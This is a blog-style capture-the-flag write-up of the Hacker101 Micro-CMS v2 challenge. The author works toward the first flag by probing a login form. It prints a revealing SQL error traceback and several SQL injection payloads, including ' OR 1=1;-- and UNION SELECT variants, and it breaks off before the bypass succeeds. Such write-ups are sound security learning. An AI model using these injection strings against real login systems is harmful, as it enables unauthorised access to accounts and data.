---
title: 'Hacker101 CTF: Micro-CMS v2'
date: 2021-09-25 17:19:06
tags:
categories:
- CTF Writeups
---
This is a part of a series I'm doing for the [Hacker101](https://www.hacker101.com/) CTF's.

This post will focus on the second CTF, named "Micro-CMS v2". This has 3 flags, and is rated as "Moderate".

This new CTF boasts several improvements upon the v1, and has the following on the changelog page in the CTF:
```
Version 2

This version fixed the multitude of security flaws and general functionality bugs that plagued v1. Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20. By default, users need to be an admin to add or edit pages now.
```

## Flag 0
Now, editing requires a login, but how can I get into an account without having the login details? Simple, I need a bypass.
To test for an SQL injection vulnerability, I simply wrote a single quote into the username box, hit enter, and got this error:
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```
Which reveals some nice information:
> The server is running on python (specifically 2.7)
> It's using MySQL
> It's using an SQL command that does not sanitize any input
So, to bypass, I first tried just using `' OR 1=1;--`, which does not work, maybe I should try a union attack?
First I try `foo' UNION SELECT 'admins', 'dummy';--` as my username, changing the SQL query to:
```sql
SELECT password FROM admins WHERE username='foo' UNION SELECT 'admin', 'dummy';--'
```
Which should work, right?
Nope, it interestingly decides to give me all the feedback I need to fix this however, and it spits out the following error:
```
The used SELECT statements have a different number of columns
```
To fix this, I simply inputed the same thing, but changed the number of dummy fields:
```sql
foo' UNION SELECT 'admins', 'dummy', 'dummy', 'dummy';-- 
```
But it seemed like however many I put in, it still spat out an error, except for when I put ONLY 1 field, "admin".
This still was not quite it though, and it returned with "Invalid password" (putting another dummy value inside of the password field did nothing here). 